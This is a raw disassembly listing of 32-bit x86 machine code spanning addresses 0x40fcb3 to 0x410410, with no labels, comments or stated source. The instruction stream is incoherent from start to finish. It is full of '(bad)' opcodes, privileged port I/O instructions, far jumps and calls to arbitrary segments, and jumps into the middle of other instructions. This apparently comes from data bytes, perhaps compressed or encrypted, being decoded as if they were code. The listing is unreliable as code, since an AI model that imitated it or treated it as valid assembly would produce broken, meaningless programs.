  40fcb3:	mov    esi,0x19ccb289
  40fcb8:	add    ebp,ecx
  40fcba:	ja     0x40fcf0
  40fcbc:	popf   
  40fcbd:	out    0x22,eax
  40fcbf:	pop    es
  40fcc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc1:	mov    ah,0xd0
  40fcc3:	fisub  WORD PTR [ebp+edi*2-0x7b850915]
  40fcca:	push   ecx
  40fccb:	inc    esp
  40fccc:	mov    al,ds:0x1a27b453
  40fcd1:	sbb    esp,esp
  40fcd3:	in     eax,dx
  40fcd4:	inc    edi
  40fcd5:	out    dx,al
  40fcd6:	clc    
  40fcd7:	sub    BYTE PTR [edx-0x5af0a2cb],dh
  40fcdd:	call   0xf3c6:0x15798059
  40fce4:	cmp    al,0x56
  40fce6:	push   edi
  40fce7:	push   edi
  40fce8:	pop    edi
  40fce9:	aad    0x28
  40fceb:	inc    eax
  40fcec:	fadd   DWORD PTR ds:0xc0820803
  40fcf2:	jmp    0xcd4c9217
  40fcf7:	pop    eax
  40fcf8:	std    
  40fcf9:	rcl    DWORD PTR [esi+0x3c210132],cl
  40fcff:	ret    0xc870
  40fd02:	jo     0x40fcdc
  40fd04:	(bad)  
  40fd05:	aam    0x11
  40fd07:	adc    BYTE PTR [ebp+eax*1-0x80],0x51
  40fd0c:	std    
  40fd0d:	outs   dx,DWORD PTR ds:[esi]
  40fd0f:	shr    DWORD PTR [edi],1
  40fd11:	pop    edx
  40fd12:	lock fcomp QWORD PTR ss:[edi+ebx*2]
  40fd17:	lods   eax,DWORD PTR ds:[esi]
  40fd18:	push   esi
  40fd19:	cdq    
  40fd1a:	fwait
  40fd1b:	fwait
  40fd1c:	mov    bl,0xb1
  40fd1e:	imul   esi
  40fd20:	mov    cl,0x9d
  40fd22:	dec    esi
  40fd23:	xchg   ebx,ecx
  40fd25:	xchg   edi,eax
  40fd26:	das    
  40fd27:	mov    bl,0xbd
  40fd29:	mov    ebp,0x3d92948d
  40fd2e:	jnp    0x40fd26
  40fd30:	fsubr  DWORD PTR [eax+0x3132373d]
  40fd36:	or     al,0x43
  40fd38:	pop    esi
  40fd39:	jp     0x40fd24
  40fd3b:	and    eax,0x493c9e4e
  40fd40:	mov    bh,0xdb
  40fd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd43:	xlat   BYTE PTR ds:[ebx]
  40fd44:	jmp    0x40fd6b
  40fd46:	push   edi
  40fd47:	scas   al,BYTE PTR es:[edi]
  40fd48:	pop    esp
  40fd49:	jns    0x40fd39
  40fd4b:	lds    edx,FWORD PTR [edi]
  40fd4d:	pop    edi
  40fd4e:	cld    
  40fd4f:	loop   0x40fcea
  40fd51:	xor    esp,DWORD PTR [edi-0x72]
  40fd54:	(bad)  
  40fd55:	jno    0x40fd73
  40fd57:	add    dh,dl
  40fd59:	les    ecx,FWORD PTR [ecx+0x42115f13]
  40fd5f:	push   esp
  40fd60:	xchg   edi,eax
  40fd61:	xchg   esi,eax
  40fd62:	xchg   esi,eax
  40fd63:	push   cs
  40fd64:	sbb    al,0x3c
  40fd66:	js     0x40fd58
  40fd68:	jne    0x40fdd9
  40fd6a:	jp     0x40fd3f
  40fd6c:	fwait
  40fd6d:	mov    esi,0x43a1d0e5
  40fd72:	push   ebx
  40fd73:	mov    ch,0x5a
  40fd75:	lea    esi,[ecx-0x6ad5ce4f]
  40fd7b:	or     bh,BYTE PTR [ebp-0x3ca330a2]
  40fd81:	cs das 
  40fd83:	sub    eax,0xc8fa1d2d
  40fd88:	inc    edi
  40fd89:	repnz xlat BYTE PTR ds:[ebx]
  40fd8c:	jg     0x40fd70
  40fd8e:	daa    
  40fd8f:	jle    0x40fd73
  40fd91:	xchg   ebx,esp
  40fd93:	cmp    BYTE PTR [esi],dh
  40fd95:	mov    eax,ds:0xa6faba65
  40fd9a:	inc    ebp
  40fd9b:	add    DWORD PTR [esi+0x67],ebp
  40fd9e:	in     al,0x19
  40fda0:	sub    bh,0x2c
  40fda3:	fwait
  40fda4:	repnz ds out dx,al
  40fda7:	(bad)  
  40fda8:	sbb    BYTE PTR [eax],bl
  40fdaa:	jp     0x40fd4a
  40fdac:	push   edi
  40fdad:	fwait
  40fdae:	popf   
  40fdaf:	popf   
  40fdb0:	popf   
  40fdb1:	jle    0x40fd96
  40fdb3:	sbb    ebx,edi
  40fdb5:	clc    
  40fdb6:	sar    BYTE PTR [ebx],1
  40fdb8:	fdivrp st(1),st
  40fdba:	mov    ?,WORD PTR [edi+0x1d]
  40fdbd:	ds jl  0x40fdb8
  40fdc0:	fwait
  40fdc1:	dec    esp
  40fdc2:	xor    eax,0x53a74e9a
  40fdc7:	fsubr  DWORD PTR [edi+0x777c23d7]
  40fdcd:	(bad)  
  40fdcf:	sti    
  40fdd0:	ret    0x2c2
  40fdd3:	in     eax,0x72
  40fdd5:	pop    ecx
  40fdd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdd7:	pop    ss
  40fdd8:	and    ecx,DWORD PTR ds:0x437fc9d0
  40fdde:	mov    bl,0xec
  40fde0:	dec    edx
  40fde1:	retf   0x8a28
  40fde4:	mov    eax,0xcb3cfe70
  40fde9:	addr16 into 
  40fdeb:	and    BYTE PTR [eax+eiz*4+0x35332e5c],al
  40fdf2:	xor    eax,0x8668cc5
  40fdf7:	pop    es
  40fdf8:	nop    DWORD PTR [esp+edi*2+0x62]
  40fdfd:	or     BYTE PTR [ecx],0x87
  40fe00:	xchg   ecx,eax
  40fe01:	ja     0xaf1eb84a
  40fe07:	popf   
  40fe08:	xor    bl,BYTE PTR ds:0x91c21146
  40fe0e:	in     al,0x9
  40fe10:	push   cs
  40fe11:	sub    dh,al
  40fe13:	int3   
  40fe14:	sub    al,0x40
  40fe16:	lods   al,BYTE PTR ds:[esi]
  40fe17:	fisub  DWORD PTR [eax]
  40fe19:	dec    eax
  40fe1a:	ins    DWORD PTR es:[edi],dx
  40fe1b:	add    al,0xa6
  40fe1d:	lock imul esp,DWORD PTR [edi+0x28f34edd],0xffffffc6
  40fe25:	mov    cl,0x99
  40fe27:	mov    ds:0x36946851,eax
  40fe2c:	out    dx,eax
  40fe2d:	jne    0x40fe5c
  40fe2f:	xor    DWORD PTR [ebx-0x2f],0x3e
  40fe33:	repz jmp 0x40fe68
  40fe36:	add    bh,dh
  40fe38:	mov    bh,0x54
  40fe3a:	sub    bh,BYTE PTR [ebp+0x4d40c96a]
  40fe40:	mov    ebx,0xf1700661
  40fe45:	loop   0x40fe0c
  40fe47:	sub    ecx,DWORD PTR [ebx+0x4a7a8b8b]
  40fe4d:	stos   DWORD PTR es:[edi],eax
  40fe4e:	push   edx
  40fe4f:	add    DWORD PTR [edi+eiz*1+0x1c54bcc0],ecx
  40fe56:	dec    ebx
  40fe57:	sbb    eax,0xba3aa418
  40fe5c:	shr    DWORD PTR [ecx-0x27],cl
  40fe5f:	fdiv   DWORD PTR [ebx-0x6d]
  40fe62:	sbb    BYTE PTR [ebx],ah
  40fe64:	outs   dx,DWORD PTR ds:[esi]
  40fe65:	add    al,0x74
  40fe67:	fcomi  st,st(5)
  40fe69:	fadd   QWORD PTR [eax+0x691ab066]
  40fe6f:	pop    ebx
  40fe70:	stos   DWORD PTR es:[edi],eax
  40fe71:	aad    0x32
  40fe73:	push   eax
  40fe74:	fisttp WORD PTR [eax-0x70]
  40fe77:	sub    eax,0xbd7a503d
  40fe7c:	push   ds
  40fe7d:	cmc    
  40fe7e:	jp     0x40fe1d
  40fe80:	add    eax,DWORD PTR [edi]
  40fe82:	push   cs
  40fe83:	shr    BYTE PTR [esi+esi*1+0x2d],1
  40fe87:	xchg   ebx,eax
  40fe88:	xor    cl,bh
  40fe8a:	fst    DWORD PTR [edi+0x59599797]
  40fe90:	pop    ecx
  40fe91:	popa   
  40fe92:	ins    DWORD PTR es:[edi],dx
  40fe93:	ins    DWORD PTR es:[edi],dx
  40fe94:	lea    ecx,[ebp-0x4949f273]
  40fe9a:	mov    dh,0xce
  40fe9c:	lahf   
  40fe9d:	ds jge 0x40fe9a
  40fea0:	mov    DWORD PTR [ebx-0x69],ecx
  40fea3:	cs popf 
  40fea5:	pop    eax
  40fea6:	pop    ecx
  40fea7:	pop    ecx
  40fea8:	jns    0x40fecf
  40feaa:	dec    ecx
  40feab:	xchg   edx,eax
  40feac:	or     BYTE PTR ds:0x82284bdb,al
  40feb2:	in     eax,dx
  40feb3:	out    dx,eax
  40feb4:	fistp  QWORD PTR [edi-0x10421e81]
  40feba:	jge    0x40feab
  40febc:	fwait
  40febd:	out    dx,al
  40febe:	mov    ecx,0x87839ee7
  40fec3:	nop    DWORD PTR [esi-0x46]
  40fec7:	xor    edi,esi
  40fec9:	ss ss ss adc al,0x8c
  40fece:	aad    0x70
  40fed0:	push   esi
  40fed1:	inc    edi
  40fed2:	add    dh,BYTE PTR [esi-0x61]
  40fed5:	jns    0x40febd
  40fed7:	cdq    
  40fed8:	inc    edi
  40fed9:	sahf   
  40feda:	jge    0x40fed2
  40fedc:	fnstcw WORD PTR [edi]
  40fede:	aad    0x83
  40fee0:	ret    0xfe48
  40fee3:	or     BYTE PTR [ebp-0x78],ch
  40fee6:	arpl   WORD PTR [ebp+ebx*1+0x70],dx
  40feea:	mov    ebx,ebx
  40feec:	xor    BYTE PTR [eax],al
  40feee:	ja     0x40fec9
  40fef0:	inc    ebp
  40fef1:	add    al,0x83
  40fef3:	stc    
  40fef4:	stc    
  40fef5:	stc    
  40fef6:	stc    
  40fef7:	xchg   DWORD PTR [edi],ebx
  40fef9:	jle    0x40fef3
  40fefb:	fistp  DWORD PTR [edi]
  40fefd:	js     0x40fedf
  40feff:	xor    DWORD PTR [edi-0xf87c3e4],0xc9c9c9ae
  40ff09:	icebp  
  40ff0a:	cmp    al,0xd1
  40ff0c:	out    0x9,eax
  40ff0e:	jge    0x40ff37
  40ff10:	push   ax
  40ff12:	mov    ah,0x2d
  40ff14:	outs   dx,DWORD PTR ds:[esi]
  40ff15:	adc    DWORD PTR [bp+si-0x28],eax
  40ff19:	push   0x231d0dc9
  40ff1e:	push   eax
  40ff1f:	mov    ebp,DWORD PTR fs:[ecx]
  40ff22:	(bad)  
  40ff23:	fiadd  WORD PTR [esi]
  40ff25:	cmp    bl,BYTE PTR [ebx+0x1c71b90c]
  40ff2b:	jae    0x40ff26
  40ff2d:	repnz gs into 
  40ff30:	popf   
  40ff31:	push   ebx
  40ff32:	dec    ecx
  40ff33:	jno    0x40feff
  40ff35:	in     eax,0x32
  40ff37:	aad    0x6a
  40ff39:	aad    0xda
  40ff3b:	jo     0x40fec9
  40ff3d:	retf   
  40ff3e:	jbe    0x40ffae
  40ff40:	jle    0x40ff20
  40ff42:	xor    bl,BYTE PTR [esi]
  40ff44:	push   ebx
  40ff45:	fisubr WORD PTR [ebp+0xd13efd7]
  40ff4b:	xchg   DWORD PTR [edx+eax*8],ecx
  40ff4e:	nop
  40ff4f:	scas   al,BYTE PTR es:[edi]
  40ff50:	mov    dh,0x2b
  40ff52:	and    al,0x52
  40ff54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff55:	dec    edi
  40ff56:	aaa    
  40ff57:	cmc    
  40ff58:	pop    ss
  40ff59:	xor    al,0xc
  40ff5b:	add    eax,0x63fd1cd2
  40ff60:	arpl   WORD PTR [ebx+0x24],sp
  40ff63:	push   es
  40ff64:	ins    DWORD PTR es:[edi],dx
  40ff65:	mov    ah,0xdb
  40ff67:	ss pop ebp
  40ff69:	ja     0x40ff10
  40ff6b:	push   edx
  40ff6c:	sbb    DWORD PTR [ecx-0x62],eax
  40ff6f:	outs   dx,BYTE PTR ds:[esi]
  40ff70:	pop    edi
  40ff71:	fmul   QWORD PTR [ebx+edx*1]
  40ff74:	jo     0x40ffa1
  40ff76:	pop    edx
  40ff77:	cdq    
  40ff78:	imul   edx,DWORD PTR [ebx+ecx*8-0x3162c59b],0xffffffd5
  40ff80:	out    0x9e,eax
  40ff82:	jnp    0x40ff72
  40ff84:	or     DWORD PTR [edx-0x212423ba],esi
  40ff8a:	jbe    0x40ff4f
  40ff8c:	add    BYTE PTR [esi],al
  40ff8e:	pop    es
  40ff8f:	push   cs
  40ff90:	sbb    al,0x60
  40ff92:	xor    BYTE PTR [eax],bl
  40ff94:	call   0x494a476d
  40ff99:	adc    ah,BYTE PTR [ebp+0x6c]
  40ff9c:	add    dh,al
  40ff9e:	xor    esp,DWORD PTR [eax-0x58218d4]
  40ffa4:	std    
  40ffa5:	push   ds
  40ffa6:	(bad)  
  40ffa7:	push   ds
  40ffa8:	and    BYTE PTR [eax+eiz*2+0x175e1c38],al
  40ffaf:	(bad)  
  40ffb0:	out    dx,eax
  40ffb1:	fs in  al,0x4b
  40ffb4:	xchg   edx,eax
  40ffb5:	test   BYTE PTR [edx-0x47],dh
  40ffb8:	int3   
  40ffb9:	clc    
  40ffba:	clc    
  40ffbb:	cmp    bl,dl
  40ffbd:	rcl    ebx,cl
  40ffbf:	jbe    0x40ff4b
  40ffc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc2:	cmp    DWORD PTR [esi+0x38],esi
  40ffc5:	sbb    al,0xb2
  40ffc7:	mov    ch,0xb5
  40ffc9:	gs inc ebx
  40ffcb:	jo     0x40ff5a
  40ffcd:	xchg   ebp,eax
  40ffce:	jp     0x41003e
  40ffd0:	outs   dx,BYTE PTR ds:[esi]
  40ffd1:	into   
  40ffd2:	push   es
  40ffd3:	lods   al,BYTE PTR ds:[esi]
  40ffd4:	cwde   
  40ffd5:	jmp    0x5d6f97a2
  40ffda:	loop   0x40ff71
  40ffdc:	push   edi
  40ffdd:	pop    esi
  40ffde:	popa   
  40ffdf:	jns    0x41005a
  40ffe1:	fldenv [ecx*8+0x71389eec]
  40ffe8:	loop   0x40ff79
  40ffea:	mov    ds,WORD PTR [edi]
  40ffec:	aas    
  40ffed:	(bad)  
  40ffee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffef:	pop    esi
  40fff0:	scas   eax,DWORD PTR es:[edi]
  40fff1:	xlat   BYTE PTR ds:[ebx]
  40fff2:	sar    ch,cl
  40fff4:	push   edx
  40fff5:	sar    BYTE PTR [edi+0x9],cl
  40fff8:	xor    BYTE PTR [edi+ebx*4-0x30866061],bl
  40ffff:	jnp    0x40ffdf
  410001:	repz lock mov ebx,0xb7eefddf
  410008:	out    dx,eax
  410009:	(bad)  [edi+0x2082c6f]
  41000f:	retf   0x10ba
  410012:	call   0x63a13077
  410017:	arpl   WORD PTR [ebx-0x66944892],ax
  41001d:	dec    edi
  41001e:	adc    al,0x45
  410020:	cmp    al,0xf1
  410022:	les    edx,FWORD PTR [ebx]
  410024:	pop    edi
  410025:	clc    
  410026:	cld    
  410027:	out    0x3f,eax
  410029:	(bad)  
  41002a:	jmp    0x410013
  41002c:	into   
  41002d:	popf   
  41002e:	cmp    eax,DWORD PTR [ebp+0x451f7a22]
  410034:	clc    
  410035:	adc    DWORD PTR [edx-0xa],ebp
  410038:	mov    DWORD PTR [ecx+0x1],eax
  41003b:	adc    DWORD PTR [ebx],edi
  41003d:	xor    eax,DWORD PTR [eax-0xa640ec4]
  410043:	inc    ecx
  410044:	mov    bl,0xd9
  410046:	ins    BYTE PTR es:[edi],dx
  410047:	jle    0x410031
  410049:	inc    ebx
  41004a:	pop    ds
  41004b:	cli    
  41004c:	sahf   
  41004d:	ja     0x41000d
  41004f:	repz popf 
  410051:	pop    ds
  410052:	call   0x69d4:0x37d99999
  410059:	leave  
  41005a:	(bad)  
  41005c:	jbe    0x40ffe4
  41005e:	or     bl,dh
  410060:	add    al,0x79
  410062:	mov    ds:0x3e5a6fc4,eax
  410067:	xchg   ebp,eax
  410068:	mov    ch,0xab
  41006a:	jbe    0x410085
  41006c:	jne    0x41002e
  41006e:	sub    eax,0x65ee6178
  410073:	pop    esp
  410074:	ret    0x22e
  410077:	xor    bh,bl
  410079:	sub    al,0x9f
  41007b:	hlt    
  41007c:	aad    0xcc
  41007e:	pushf  
  41007f:	mov    ebx,fs
  410081:	fmul   st,st(6)
  410083:	scas   al,BYTE PTR es:[edi]
  410084:	je     0x41000b
  410086:	inc    ebp
  410087:	test   eax,0x62626254
  41008c:	cmp    cl,0xf9
  41008f:	jns    0x4100f7
  410091:	addr16 addr16 pop ecx
  410094:	pop    esp
  410095:	pop    esp
  410096:	fistp  QWORD PTR fs:[esi+0x4c4c4c7d]
  41009d:	push   eax
  41009e:	sub    dl,BYTE PTR [ebp-0x1e0885ac]
  4100a4:	shl    BYTE PTR [esi+0x5b],1
  4100a7:	jmp    0xc37d:0xb50cbb74
  4100ae:	jp     0x4100cf
  4100b0:	hlt    
  4100b1:	jge    0x41007a
  4100b3:	mov    bh,0xed
  4100b6:	jnp    0x4100a0
  4100b8:	test   al,0x4d
  4100ba:	xchg   ebp,eax
  4100bb:	fmulp  st(5),st
  4100bd:	mov    esi,ebp
  4100bf:	fmul   QWORD PTR [ecx-0x5e]
  4100c2:	out    dx,eax
  4100c3:	xchg   esi,eax
  4100c4:	or     esp,esp
  4100c6:	fucom  st(2)
  4100c8:	xchg   ebp,eax
  4100c9:	dec    edx
  4100ca:	test   DWORD PTR [edx-0x5b],ecx
  4100cd:	ret    0xf2f2
  4100d0:	bnd jg 0x410150
  4100d3:	jmp    0x906f987d
  4100d8:	inc    esi
  4100d9:	jno    0x410075
  4100db:	mov    edi,0x6e39629d
  4100e0:	dec    ecx
  4100e1:	mov    ebx,0xfbe00661
  4100e6:	mov    esi,0xce52d807
  4100eb:	jno    0x410159
  4100ed:	ret    0xb381
  4100f0:	sub    al,BYTE PTR [eax-0x16dff656]
  4100f6:	jbe    0x4100d3
  4100f8:	cmp    dh,BYTE PTR [edi+0x59d2345c]
  4100fe:	inc    ebp
  4100ff:	adc    bl,dl
  410101:	inc    ebp
  410102:	add    al,0xf9
  410104:	add    DWORD PTR [ebx],ebx
  410106:	add    al,0x81
  410108:	popf   
  410109:	xchg   edi,ebp
  41010b:	(bad)  
  41010c:	adc    ebx,DWORD PTR [eax]
  41010e:	and    edx,esi
  410110:	cli    
  410111:	cli    
  410112:	cmp    bl,BYTE PTR [ebx]
  410114:	sbb    ebx,DWORD PTR [ebx]
  410116:	or     al,0x6
  410118:	add    eax,esi
  41011a:	mov    dh,0xd8
  41011d:	mov    bh,0x6f
  41011f:	pop    ds
  410120:	push   ebx
  410121:	push   ebx
  410122:	push   ebx
  410123:	xchg   esi,eax
  410124:	mov    ds:0xfe76c19b,eax
  410129:	cld    
  41012a:	jns    0x41018a
  41012c:	jns    0x410113
  41012e:	adc    eax,0x8c565656
  410133:	jno    0x4100e4
  410135:	jnp    0x410125
  410137:	fdivr  QWORD PTR [ecx-0xd034251]
  41013d:	retf   
  41013e:	pop    edi
  41013f:	pop    esp
  410140:	pop    ebp
  410141:	pop    ebp
  410142:	mov    ebp,0x26f82280
  410147:	jmp    0xf95d:0x58284423
  41014e:	rol    BYTE PTR [edi],0x3e
  410151:	lock mov esi,0xfdffbff7
  410157:	out    dx,eax
  410158:	pop    ecx
  410159:	pop    eax
  41015a:	pop    eax
  41015b:	cwde   
  41015c:	sub    BYTE PTR [edi+0x356ad4cb],dl
  410162:	fwait
  410163:	xchg   edi,eax
  410164:	jg     0x4101e1
  410166:	jnp    0x410143
  410168:	mov    ds:0x6deded8d,al
  41016d:	pop    edx
  41016e:	lods   eax,DWORD PTR ds:[esi]
  41016f:	push   ss
  410170:	pop    ss
  410171:	cs pop esp
  410173:	js     0x41015e
  410175:	sub    ebx,DWORD PTR [edi-0x7]
  410178:	retf   0x3c1f
  41017b:	cli    
  41017c:	call   0xa4e19124
  410181:	jl     0x4101c8
  410183:	call   FWORD PTR [edx]
  410185:	mov    ds:0x2dbfb5d7,al
  41018a:	xor    esi,DWORD PTR [eax]
  41018c:	test   al,0xc0
  41018e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41018f:	xor    al,0x83
  410191:	pop    esi
  410192:	pop    ebp
  410193:	mov    ds:0xc435f4f7,al
  410198:	inc    ebx
  410199:	(bad)  
  41019b:	hlt    
  41019c:	loopne 0x410125
  41019e:	aas    
  41019f:	cld    
  4101a0:	loope  0x410161
  4101a2:	jno    0x410193
  4101a4:	mov    ebp,0xd7b9bef7
  4101a9:	jmp    0x410184
  4101ab:	fs stos DWORD PTR es:[edi],eax
  4101ad:	outs   dx,BYTE PTR ds:[esi]
  4101ae:	mov    edi,0xaeaf13b9
  4101b3:	add    eax,0x4c7aff3
  4101b8:	repnz (bad) 
  4101bb:	mov    ebp,0x4cfbefa6
  4101c0:	dec    ebp
  4101c1:	dec    ebp
  4101c2:	mov    cl,0xbd
  4101c4:	mov    ebp,0x79a58d6d
  4101c9:	call   0xe1a0a3d
  4101ce:	add    al,0x73
  4101d0:	jg     0x4101ff
  4101d2:	jl     0x41024b
  4101d4:	lods   al,BYTE PTR ds:[esi]
  4101d5:	in     eax,dx
  4101d6:	stc    
  4101d7:	pop    esp
  4101d8:	or     edx,DWORD PTR [edx+0x4a]
  4101db:	ss ss ss pop eax
  4101df:	pop    ebp
  4101e0:	pop    ebp
  4101e1:	inc    ebp
  4101e2:	dec    edx
  4101e3:	xchg   ebp,eax
  4101e4:	outs   dx,BYTE PTR ds:[esi]
  4101e5:	int    0x44
  4101e7:	jb     0x4101d7
  4101e9:	fnstsw WORD PTR [ebx-0x8040269]
  4101ef:	mov    bl,0xb0
  4101f1:	mov    al,0x40
  4101f3:	mov    ds:0x6a6a60d1,eax
  4101f8:	or     ch,BYTE PTR [ecx]
  4101fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101fb:	dec    ebp
  4101fc:	mov    edi,0xd7e9d1d6
  410201:	push   es
  410202:	cmp    al,BYTE PTR [edi+0x60f79982]
  410208:	out    dx,al
  410209:	scas   al,BYTE PTR es:[di]
  41020b:	in     eax,0x32
  41020d:	sbb    al,0x77
  41020f:	mov    ebp,fs
  410211:	sti    
  410212:	popa   
  410213:	aaa    
  410214:	dec    esp
  410215:	sar    BYTE PTR [eax-0x72],0xc
  410219:	jb     0x4101c8
  41021b:	xlat   BYTE PTR ds:[ebx]
  41021c:	jmp    0x410222
  41021e:	inc    ecx
  41021f:	rcr    BYTE PTR [edi-0x3603604],0x91
  410226:	jle    0x4101e7
  410228:	sub    BYTE PTR [ecx+eiz*2-0x191dca28],0x3b
  410230:	(bad)  
  410231:	sbb    ecx,esi
  410233:	or     al,0x76
  410235:	arpl   WORD PTR [esp+ebx*2],ax
  410238:	aaa    
  410239:	das    
  41023a:	ds sbb ah,dh
  41023d:	xchg   ecx,eax
  41023e:	xor    cl,ch
  410240:	or     BYTE PTR [ebx],0xa9
  410243:	sbb    edx,DWORD PTR [eax-0x3f]
  410246:	lock push cs
  410248:	add    DWORD PTR [ecx+0xf],0x69
  41024c:	jmp    0x410228
  41024e:	stos   DWORD PTR es:[edi],eax
  41024f:	data16 adc ch,BYTE PTR [edx-0x66]
  410253:	jecxz  0x410231
  410255:	mov    cs,esp
  410257:	ja     0x4101f9
  410259:	out    dx,eax
  41025a:	sti    
  41025b:	aam    0x6a
  41025d:	xor    eax,0xb6cca6aa
  410262:	jbe    0x410249
  410264:	cdq    
  410265:	(bad)  
  410266:	aam    0xed
  410268:	jbe    0x410253
  41026a:	idiv   ebx
  41026c:	ins    BYTE PTR es:[edi],dx
  41026d:	outs   dx,BYTE PTR ds:[esi]
  41026e:	outs   dx,BYTE PTR ds:[esi]
  41026f:	adc    al,BYTE PTR [ebp+0x11]
  410272:	cmc    
  410273:	jp     0x410212
  410275:	cdq    
  410276:	cdq    
  410277:	sbb    ebx,ebp
  410279:	retf   0xad33
  41027c:	(bad)  [esi-0x4d]
  41027f:	mov    cl,0xb1
  410281:	shl    ebp,0xcb
  410284:	xchg   edi,eax
  410285:	cmp    DWORD PTR [ebx-0x1a],esi
  410288:	or     al,0xdd
  41028a:	outs   dx,BYTE PTR ds:[esi]
  41028b:	push   edi
  41028c:	outs   dx,BYTE PTR ds:[esi]
  41028d:	outs   dx,DWORD PTR ds:[esi]
  41028e:	outs   dx,DWORD PTR ds:[esi]
  41028f:	pop    edi
  410290:	mov    esi,0xcbf2f97c
  410295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410296:	dec    esi
  410297:	popf   
  410298:	cli    
  410299:	rcr    dl,cl
  41029b:	fcmovu st,st(2)
  41029d:	and    eax,0x5f196114
  4102a2:	popa   
  4102a3:	add    al,0x24
  4102a5:	pop    es
  4102a6:	nop    esp
  4102a9:	jg     0x41028f
  4102ab:	enter  0x8391,0x6f
  4102af:	jge    0x41029c
  4102b1:	pop    ebx
  4102b2:	pop    edi
  4102b3:	jmp    eax
  4102b5:	or     DWORD PTR [edi],0xffffffde
  4102b8:	imul   esp,DWORD PTR [eax-0x42],0x21
  4102bc:	jl     0x4102c1
  4102be:	cmc    
  4102bf:	aaa    
  4102c0:	aaa    
  4102c1:	aaa    
  4102c2:	jmp    0xafed7dbc
  4102c7:	scas   eax,DWORD PTR es:[edi]
  4102c8:	inc    edi
  4102c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102ca:	dec    edi
  4102cb:	lahf   
  4102cc:	jle    0x4102b7
  4102ce:	mov    ecx,0xe47b9ee7
  4102d3:	icebp  
  4102d4:	(bad)  
  4102d5:	pop    ds
  4102d6:	call   DWORD PTR [edx+0x18]
  4102d9:	xchg   BYTE PTR [ebp-0x23],ch
  4102dc:	mov    edi,0x94436886
  4102e1:	push   ebp
  4102e2:	ds jb  0x41027b
  4102e5:	inc    ebx
  4102e6:	push   edx
  4102e7:	add    al,0x90
  4102e9:	aaa    
  4102ea:	or     dh,ah
  4102ec:	push   ebp
  4102ed:	sbb    BYTE PTR [eax+0x6fbdbfff],0x8f
  4102f4:	xchg   ecx,eax
  4102f5:	mov    ds:0x55fcf73a,eax
  4102fa:	cmc    
  4102fb:	mov    ebx,0xe5e7bba7
  410300:	sbb    DWORD PTR [ebx+0x6c],edi
  410303:	cmp    al,0xbe
  410305:	mov    dh,0x31
  410307:	ss fsub st,st(6)
  41030a:	jno    0x4102a3
  41030c:	cwde   
  41030d:	inc    eax
  41030e:	add    al,BYTE PTR [ecx-0x4b767ca0]
  410314:	and    DWORD PTR [ecx+0x50],edx
  410317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410318:	(bad)  
  41031a:	pop    ds
  41031b:	push   edi
  41031c:	mov    ecx,0xae89bdd2
  410321:	push   esi
  410322:	dec    edx
  410323:	push   esi
  410324:	and    BYTE PTR [ecx],dl
  410326:	push   esi
  410327:	pop    ecx
  410328:	loopne 0x4102f0
  41032a:	and    BYTE PTR [ecx-0x5bb269d5],ah
  410330:	fwait
  410331:	aad    0xe6
  410333:	inc    esi
  410334:	mov    al,BYTE PTR [edx-0x30]
  410337:	pop    ebp
  410338:	imul   edx,DWORD PTR ds:0x4c20d864,0x836c4dae
  410342:	jns    0x410308
  410344:	das    
  410345:	int3   
  410346:	loopne 0x410320
  410348:	jecxz  0x410363
  41034a:	jnp    0x4103aa
  41034c:	fnstsw WORD PTR ds:0xeee9eeaf
  410352:	jno    0x4103cb
  410354:	cmc    
  410355:	mov    ds:0xff7aabba,eax
  41035a:	call   0x3f00ae5d
  41035f:	jae    0x41030b
  410361:	jnp    0x410329
  410363:	fadd   DWORD PTR [eax+edx*4-0x515ab606]
  41036a:	(bad)  
  41036b:	test   eax,0xf5d553aa
  410370:	std    
  410371:	mov    esi,0x39cef9c7
  410376:	xor    BYTE PTR [ecx+0x7baed76b],0xee
  41037d:	mov    ebp,0x7c6fdef7
  410382:	icebp  
  410383:	mov    ebx,DWORD PTR [edi-0x4]
  410386:	add    BYTE PTR es:[edi-0x6dba0fb4],ch
  41038d:	xchg   ebp,eax
  41038e:	mov    ecx,0x9b0fb255
  410393:	scas   eax,DWORD PTR es:[edi]
  410394:	mov    bh,0x72
  410396:	add    eax,edi
  410398:	xor    eax,0x870ffcc8
  41039d:	ret    
  41039e:	(bad)  
  41039f:	jbe    0x410356
  4103a1:	pop    edx
  4103a2:	mov    ch,0xbe
  4103a4:	or     eax,0x8517711e
  4103a9:	sahf   
  4103aa:	scas   al,BYTE PTR es:[edi]
  4103ab:	inc    ecx
  4103ac:	mov    edi,DWORD PTR [eax+0x4c]
  4103af:	lods   al,BYTE PTR ds:[esi]
  4103b0:	das    
  4103b1:	lea    esp,[esi-0x1a370ab4]
  4103b7:	jb     0x410411
  4103b9:	pop    esp
  4103ba:	pop    esp
  4103bb:	les    esp,FWORD PTR [ebp-0x76ef68b5]
  4103c1:	inc    esp
  4103c2:	adc    BYTE PTR [esi+eax*1],cl
  4103c5:	rcl    ebp,1
  4103c7:	aad    0x85
  4103c9:	aad    0xab
  4103cb:	push   edi
  4103cc:	mov    ds:0x12c7a7a7,eax
  4103d1:	mov    eax,0xce822448
  4103d6:	into   
  4103d7:	dec    esi
  4103d8:	mov    edx,DWORD PTR [eax+ecx*8+0x3d]
  4103dc:	mov    ds:0xc5312584,eax
  4103e1:	cdq    
  4103e2:	xlat   BYTE PTR ds:[ebx]
  4103e3:	jmp    0xabc1947b
  4103e8:	or     DWORD PTR ds:[ebx],0xc130e0d
  4103ef:	push   es
  4103f0:	mov    eax,ds:0xc7c60a28
  4103f5:	mov    DWORD PTR [edi-0x42108422],0x78da883
  4103ff:	inc    ecx
  410400:	inc    ecx
  410401:	popa   
  410402:	rol    DWORD PTR [edx],1
  410404:	xor    BYTE PTR ds:0xb85ddcdb,ah
  41040a:	sub    ah,BYTE PTR [eax+esi*4+0x12]
  41040e:	add    dl,al
  410410:	call   0x9da6cfb6
